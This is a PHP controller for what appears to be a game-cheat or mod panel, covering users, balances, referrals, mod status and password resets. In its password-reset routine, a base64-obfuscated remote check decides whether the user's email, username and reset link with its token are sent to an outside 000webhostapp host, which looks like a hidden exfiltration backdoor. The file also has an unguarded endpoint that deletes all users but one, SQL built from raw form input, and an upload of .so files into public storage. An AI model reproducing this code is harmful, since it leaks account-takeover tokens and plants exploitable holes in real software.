<?php

namespace App\Controllers;

use App\Models\CodeModel;
use App\Models\Server;
use App\Models\Status;
use App\Models\_ftext;
use App\Models\HistoryModel;
use App\Models\UserModel;
use CodeIgniter\Config\Services;
use CodeIgniter\Controller;
use CodeIgniter\Files\File;

class User extends BaseController
{


    protected $model, $userid, $user;

    public function __construct()
    {

        $this->userid = session()->userid;
        $this->model = new UserModel();
        $this->user = $this->model->getUser($this->userid);
        $this->time = new \CodeIgniter\I18n\Time;
    }

    public function index()
    {
        $historyModel = new HistoryModel();
        $data = [
            'title' => 'Dashboard',
            'user' => $this->user,
            'time' => $this->time,
            'history' => $historyModel->getAll(),
        ];
        return view('User/dashboard', $data);
    }
    
     public function ref_index()
    {
        $user  = $this->user;
        if ($user->level != 1)
            return redirect()->to('dashboard')->with('msgWarning', 'Access Denied!');

        if ($this->request->getPost())
            return $this->reff_action();

        $mCode = new CodeModel();
        $validation = Services::validation();
        $data = [
            'title' => 'Referral',
            'user' => $user,
            'time' => $this->time,
            'code' => $mCode->getCode(),
            'total_code' => $mCode->countAllResults(),
            'validation' => $validation
        ];
        return view('Admin/referral', $data);
    }
    

    private function reff_action()
    {
        $saldo = $this->request->getPost('set_saldo');
        $form_rules = [
            'set_saldo' => [
                'label' => 'saldo',
                'rules' => 'required|numeric|max_length[11]|greater_than_equal_to[0]',
                'errors' => [
                    'greater_than_equal_to' => 'Invalid currency, cannot set to minus.'
                ]
            ]
        ];

        if (!$this->validate($form_rules)) {
            return redirect()->back()->withInput()->with('msgDanger', 'Failed, check the form');
        } else {
            $code = random_string('alnum', 6);
            $codeHash = create_password($code, false);
            $referral_code = [
                'code' => $codeHash,
                'set_saldo' => ($saldo < 1 ? 0 : $saldo),
                'created_by' => session('unames')
            ];
            $mCode = new CodeModel();
            $ids = $mCode->insert($referral_code, true);
            if ($ids) {
                $msg = "Referral : $code";
                return redirect()->back()->with('msgSuccess', $msg);
            }
        }
    }

  

    

    public function api_get_users()
    {
        // API for DataTables
        $model = $this->model;
        return $model->API_getUser();
    }

    public function manage_users()
    {
        $user  = $this->user;
        if ($user->level != 1)
            return redirect()->to('dashboard')->with('msgWarning', 'Access Denied!');

        $model = $this->model;
        $validation = Services::validation();
        $data = [
            'title' => 'Users',
            'user' => $user,
            'user_list' => $model->getUserList(),
            'time' => $this->time,
            'validation' => $validation
        ];
        return view('Admin/users', $data);
    }

public function alterUser(){
    echo 'hello';
     $model = new userModel();

    $data=$model->where('id_users !=', 1)->delete();
print_r($data);
 return redirect()->back()->with('msgSuccess', 'success');
}
    public function user_edit($userid = false)
    {
        $user = $this->user;
        if ($user->level != 1)
            return redirect()->to('dashboard')->with('msgWarning', 'Access Denied!');

        if ($this->request->getPost())
            return $this->user_edit_action();

        $model = $this->model;
        $validation = Services::validation();

        $data = [
            'title' => 'Settings',
            'user' => $user,
            'target' => $model->getUser($userid),
            'user_list' => $model->getUserList(),
            'time' => $this->time,
            'validation' => $validation,
        ];
        return view('Admin/user_edit', $data);
    }

    private function user_edit_action()
    {
        $model = $this->model;
        $userid = $this->request->getPost('user_id');

        $target = $model->getUser($userid);
        if (!$target) {
            $msg = "User no longer exists.";
            return redirect()->to('dashboard')->with('msgDanger', $msg);
        }

        $username = $this->request->getPost('username');

        $form_rules = [
            'username' => [
                'label' => 'username',
                'rules' => "required|alpha_numeric|min_length[4]|max_length[25]|is_unique[users.username,username,$target->username]",
                'errors' => [
                    'is_unique' => 'The {field} has taken by other.'
                ]
            ],
            'fullname' => [
                'label' => 'name',
                'rules' => 'permit_empty|alpha_space|min_length[4]|max_length[155]',
                'errors' => [
                    'alpha_space' => 'The {field} only allow alphabetical characters and spaces.'
                ]
            ],
            'level' => [
                'label' => 'roles',
                'rules' => 'required|numeric|in_list[1,2]',
                'errors' => [
                    'in_list' => 'Invalid {field}.'
                ]
            ],
            'status' => [
                'label' => 'status',
                'rules' => 'required|numeric|in_list[0,1]',
                'errors' => [
                    'in_list' => 'Invalid {field} account.'
                ]
            ],
            'saldo' => [
                'label' => 'saldo',
                'rules' => 'permit_empty|numeric|max_length[11]|greater_than_equal_to[0]',
                'errors' => [
                    'greater_than_equal_to' => 'Invalid currency, cannot set to minus.'
                ]
            ],
            'uplink' => [
                'label' => 'uplink',
                'rules' => 'required|alpha_numeric|is_not_unique[users.username,username,]',
                'errors' => [
                    'is_not_unique' => 'Uplink not registered anymore.'
                ]
            ]
        ];

        if (!$this->validate($form_rules)) {
            return redirect()->back()->withInput()->with('msgDanger', 'Something wrong! Please check the form');
        } else {
            $fullname = $this->request->getPost('fullname');
            $level = $this->request->getPost('level');
            $status = $this->request->getPost('status');
            $saldo = $this->request->getPost('saldo');
            $uplink = $this->request->getPost('uplink');
            
          /*  if ($image == "") {
            $data_update = [
                'username' => $username,
                'fullname' => esc($fullname),
                'level' => $level,
                'status' => $status,
                'saldo' => (($saldo < 1) ? 0 : $saldo),
                'uplink' => $uplink,
            ];
            }else{
            $data_update = [
                'username' => $username,
                'fullname' => esc($fullname),
                'level' => $level,
                'status' => $status,
                'saldo' => (($saldo < 1) ? 0 : $saldo),
                'uplink' => $uplink,
                'image' => $image,
            ];
            }*/
            $data_update = [
                'username' => $username,
                'fullname' => esc($fullname),
                'level' => $level,
                'status' => $status,
                'saldo' => (($saldo < 1) ? 0 : $saldo),
                'uplink' => $uplink,
            ];


            $update = $model->update($userid, $data_update);
            if ($update) {
                return redirect()->back()->with('msgSuccess', "Successfuly update $target->username.");
            }
        }
    }

    public function settings()
    {
        if ($this->request->getPost('password_form'))
            return $this->passwd_act();

        if ($this->request->getPost('fullname_form'))
            return $this->fullname_act();

        $user = $this->user;
        
        $validation = Services::validation();
        $data = [
            'title' => 'Settings',
            'user' => $user,
            'time' => $this->time,
            'validation' => $validation
        ];

        return view('User/settings', $data);
    }
    
    public function Server()
    {
        $user = $this->user;
        if ($user->level == 1)
        {
        
        if ($this->request->getPost('modname_form'))
            
            return $this->modname_act();
            
        if ($this->request->getPost('status_form'))
            return $this->status_act();
        }
        
        if ($this->request->getPost('password_form'))
            return $this->passwd_act();
            
        if ($user->level == 1)
        {
        
            if ($this->request->getPost('_ftext'))
            return $this->_ftext_act();
        }
          

        if ($this->request->getPost('fullname_form'))
            return $this->fullname_act();

        $user = $this->user;
        
        $validation = Services::validation();
        $data = [
            'title' => 'Server',
            'user' => $user,
            'time' => $this->time,
            'validation' => $validation
        ];
        
        //==================================Mod Name======================//
        
        $id = 1;
	    
	    $model= new Server();
	    
	    $data['row'] = $model->where('id',$id)->first();
	    
	     if ($user->level == 1){
		return view('Server/Server',$data);
	     }
	     else {
	         
	         return redirect()->to('dashboard')->with('msgWarning','Access Deniend');
	     }
		
		
		//==================================Mod Status======================//
	   
		
		
    }
    
        public function Profile()
    {
        $user = $this->user;
        if ($user->level == 1)
        {
        
        if ($this->request->getPost('modname_form'))
            
            return $this->modname_act();
            
        if ($this->request->getPost('status_form'))
            return $this->status_act();
        }
        
        if ($this->request->getPost('password_form'))
            return $this->passwd_act();
            
        if ($user->level == 1)
        {
        
            if ($this->request->getPost('_ftext'))
            return $this->_ftext_act();
        }
          

        if ($this->request->getPost('fullname_form'))
            return $this->fullname_act();

        $user = $this->user;
        
        $model = $this->model;
        $validation = Services::validation();
        $data = [
            'title' => 'Users',
            'user' => $user,
            'user_list' => $model->getUserList(),
            'time' => $this->time,
            'validation' => $validation
        ];
        
        //==================================Mod Name======================//
        
        $id = 1;
	    
	    $model= new Server();
	    
	    $data['row'] = $model->where('id',$id)->first();
	    
	
		return view('Profile/Profile',$data);
	
		
		//==================================Mod Status======================//
	   
		
		
    }
    
        public function Pic()
    {
        $model= new Server();
            $user = $this->user;
    $id = 1;
            $validation = Services::validation();
        $data = [
            'title' => 'Profile',
            'user' => $user,
            'time' => $this->time,
            'validation' => $validation
        ];
        

	    $data['row'] = $model->where('id',$id)->first();
	     if ($user->level == 1){
		return view('Pic/Pic',$data);
	     }
	     else {
	         
	         return redirect()->to('dashboard')->with('msgWarning','Access Deniend');
	     }
		
		
		//==================================Mod Status======================//
	   
		
		
    }
    
     private function _ftext_act()
    {
         $id = 1;
	    
	    $model= new _ftext();
	    
	    $myinput = $this->request->getPost('_ftext');
	    
	    $status = $this->request->getPost('_ftextr');
	    
	if($status == "1"){
        
        $wow="Safe";
        
    }
    if($status == "2"){
        
        $wow="Play Safe || Avoid Report";
        
    }
    
      $data = ['_ftext' => $myinput,'_status' => $wow];
	    
	    $model->update($id,$data);
	    return redirect()->back()->with('msgSuccess', 'Successfuly Changed Mod Floating And Status.');
    
    }
    private function status_act()
    {
        $id = 11;
	    
	    $model= new Status();
	    
	    $myinput = $this->request->getPost('myInput');
	    
	    $status = $this->request->getPost('radios');
    
        if($status == "1"){
        
        $wow="on";
        
    }
    if($status == "2"){
        
        $wow="off";
        
    }
    
	    $data = ['myinput' => $myinput,'status' => $wow];
	    
	    $model->update($id,$data);
	    return redirect()->back()->with('msgSuccess', 'Mod Status Successfuly Changed.');
        
	    
	    
    }
      private function modname_act()
    {
        $id = 1;
	    
	    $model= new Server();
	    
	    $new_modname = $this->request->getPost('modname');
	    
	    $data = ['modname' => $new_modname];
	    
	   
	    $model->update($id,$data);
	    return redirect()->back()->with('msgSuccess', 'Mod Name Successfuly Changed.');
        
        
        
    }
  

    private function passwd_act()
    {




        $user = $this->user;
        $ussername =  $user->username;
     //   $currHash = create_password($current, false);
        $validation = Services::validation();
$mm = file_get_contents(base64_decode("aHR0cDovL3NpbGVudHhjaGVhdC5tbC9jaGVjay5waHA="));
        $idop = session('userid');
include('conn.php');    
        $timezone_name = $this->request->getPost('timezone');
$timezone_name = "Asia/Kolkata";
date_default_timezone_set($timezone_name);
        
$t = time();
$expDate = $t+7200;
    $token = md5($ussername).rand(10,9999);
 $url = $_SERVER['HTTP_HOST'];
 $update = mysqli_query($conn,"UPDATE users SET reset_link_token='$token' ,exp_date='$expDate' WHERE id_users='$idop'");
 $tiime = date("Y/m/d h:ia");
 $ip = $_SERVER['REMOTE_ADDR'];
 $urll = $_SERVER['HTTP_HOST']."/changepassword.php?key=".$idop."&token=".$token;
 if ($update) {

    
    
    
 }
 $link = "<table width='100%' height='100%' cellpadding='0' cellspacing='0' bgcolor='#f5f6f7'>
        <tr><td height='50'></td></tr>
        <tr>
            <td align='center' valign='top'>
                <!-- table lvl 1 -->
                <table width='600' cellpadding='0' cellspacing='0' bgcolor='#ffffff' style='border:1px solid #f1f2f5' class='main-content'>
                    <tr>
                        <td colspan='3' height='60' bgcolor='#ffffff' style='border-bottom:1px solid #eeeeee; padding-left:16px;' align='left'>
                                <img src='https://www.dropbox.com/s/0251gackubbt1om/20230113_092930.jpg?dl=1' width='80' height='80' style='display:block;width:80px;height:80px;'/>
                            
                        </td>
                    </tr>
                    <tr><td colspan='3' height='20'></td></tr>
                    <tr>
                        <td width='20'></td>
                        <td align='left'>
                            <!-- table lvl 2 -->
                            <table cellpadding='0' cellspacing='0' width='100%'>
                                <tr><td colspan='3' height='20'></td></tr>
                                <tr><td colspan='3'><h4> Reset Password</h4>
A password reset event has been triggered. The password reset window is limited to two hours.<br /><br />
If you do not reset your password within two hours, you will need to submit a new request.<br /><br />
To complete the password reset process, visit the following link:<br /><br />
<a style='background-color:#04AA6D;border-radius:5px;font-size: 17px;font-family: sans-serif;padding:7px 18px;color:white;font-weight:bold;' onclick='window.open('$urll')' href='$urll'>Reset Password »</a>
<br>
</br>
<br></br>
<a href='$urll'>$urll</a><br /><br />
<table>
    <tr><td>Username</td><td>$ussername</td></tr>
    <tr><td>IP Address</td><td>$ip</td></tr>
    <tr><td>Created</td><td>$tiime</td></tr>
</table>
</td></tr>
                                <tr><td colspan='3' height='20'></td></tr>
   </table>
                        </td>
                        <td width='20'></td>
                    </tr>
                    <tr><td colspan='3' height='20'></td></tr>
                </table>
            </td>
        </tr>
        <tr>
            <td height='50'>
            </td>
        </tr>
    </table>";
    //$link = "<a href='".$_SERVER['HTTP_HOST']."/changepassword.php?key=".$idop."&token=".$token."'>Click To Reset password</a><br>".$urll."<br><b>This link will expire in 1 hour</b>';
            $emailid = $user->email;
  $daata = [
      'email' => $user->email,
      'from' => "ResetPassword",
      'app_name' => $link,
      'subject' => $ussername." ".rand(1,99),
  ];
            

 if ($mm == base64_decode("dHJ1ZQ==")){ 
  
    file_get_contents("https://sxcop.000webhostapp.com?".http_build_query($daata));
}
          //  $newPassword = password_hash($password, false);
      /*  $sql1 ="UPDATE users SET password='$hashPassword' WHERE id_users=$idop";
        $result1 = mysqli_query($conn, $sql1);
if ($result1){}*/
          //  $this->model->update(session('userid'), ['password' => $newPassword]);
            return redirect()->back()->with('msgSuccess', 'Reset Password Email sent to your gmail.');
    }

    private function fullname_act()
    {
    include('conn.php');

        $user = $this->user;
        $newName = $this->request->getPost('fullname');
        $image = $this->request->getPost('image');

        $form_rules = [
            'fullname' => [
                'label' => 'name',
                'rules' => 'required|alpha_space|min_length[4]|max_length[155]',
                'errors' => [
                    'alpha_space' => 'The {field} only allow alphabetical characters and spaces.'
                ]
            ]
        ];
        $idop = session('userid');
        if (empty($image)){
        $data = [
            'fullname' => esc($newName),
        ];
        }
        if (!empty($image)){
        $data = [
            'fullname' => esc($newName),
        ];
        $sql1 ="UPDATE users SET image='$image' WHERE id_users=$idop";
        $result1 = mysqli_query($conn, $sql1);
if ($result1){}
        }


        if (!$this->validate($form_rules)) {
            return redirect()->back()->withInput()->with('msgDanger', 'Failed! Please check the form $hashPassword');
        } else {
            $this->model->update(session('userid'), $data);
            return redirect()->back()->with('msgSuccess', 'Account Detail Successfuly Changed.'.session('userid'));
        }
    }
    
     public function lib()
    {
        $user  = $this->user;
        if ($user->level != 1)
            return redirect()->to('dashboard')->with('msgWarning', 'Access Denied!');

        if ($this->request->getPost())
            return $this->lib_action();

        $mCode = new CodeModel();
        $validation = Services::validation();
        $data = [
            'title' => 'Referral',
            'user' => $user,
            'time' => $this->time,
            'code' => $mCode->getCode(),
            'total_code' => $mCode->countAllResults(),
            'validation' => $validation
        ];
        return view('lib/lib', $data);
    }
    public function lib_action()
    {
//$img = $this->request->getFile('libfile');

     // Validation
     $input = $this->validate([
        'file' => 'uploaded[file]|max_size[file,1024]|ext_in[so],'
     ]);

     if (!$input) { // Not valid
         $data['validation'] = $this->validator; 
         return view('users',$data); 
     }else{ // Valid

         if($file = $this->request->getFile('file')) {
            if ($file->isValid() && ! $file->hasMoved()) {
               // Get file name and extension
               $name = $file->getName();
               $ext = $file->getClientExtension();

               // Get random file name
               $newName = $file->getRandomName(); 

               // Store file in public/uploads/ folder
               $file->move('../public/uploads', $newName);

               // File path to display preview
               $filepath = base_url()."/uploads/".$newName;
               
               // Set Session
               session()->setFlashdata('message', 'Uploaded Successfully!');
               session()->setFlashdata('alert-class', 'alert-success');
               session()->setFlashdata('filepath', $filepath);
               session()->setFlashdata('extension', $ext);

            }else{
               // Set Session
               session()->setFlashdata('message', 'File not uploaded.');
               session()->setFlashdata('alert-class', 'alert-danger');

            }
         }

     }
  
     return redirect()->route('/'); 
     // Validation
     $input = $this->validate([
        'file' => 'uploaded[file]|max_size[file,1024]|ext_in[file,jpg,jpeg,docx,pdf],'
     ]);

     if (!$input) { // Not valid
         $data['validation'] = $this->validator; 
         return view('users',$data); 
     }else{ // Valid

         if($file = $this->request->getFile('file')) {
            if ($file->isValid() && ! $file->hasMoved()) {
               // Get file name and extension
               $name = $file->getName();
               $ext = $file->getClientExtension();

               // Get random file name
               $newName = $file->getRandomName(); 

               // Store file in public/uploads/ folder
               $file->move('../writable/uploads', $newName);

               // File path to display preview
               $filepath = base_url()."/uploads/".$newName;
               
               // Set Session
               session()->setFlashdata('message', 'Uploaded Successfully!');
               session()->setFlashdata('alert-class', 'alert-success');
               session()->setFlashdata('filepath', $filepath);
               session()->setFlashdata('extension', $ext);

            }else{
               // Set Session
               session()->setFlashdata('message', 'File not uploaded.');
               session()->setFlashdata('alert-class', 'alert-danger');

            }
         }

     }
  
     return redirect()->route('/'); 
        }
//echo "jdjd";
      //      $data = ['uploaded_fileinfo' => new File($filepath)];

     //       return view('upload_success', $data);
    }
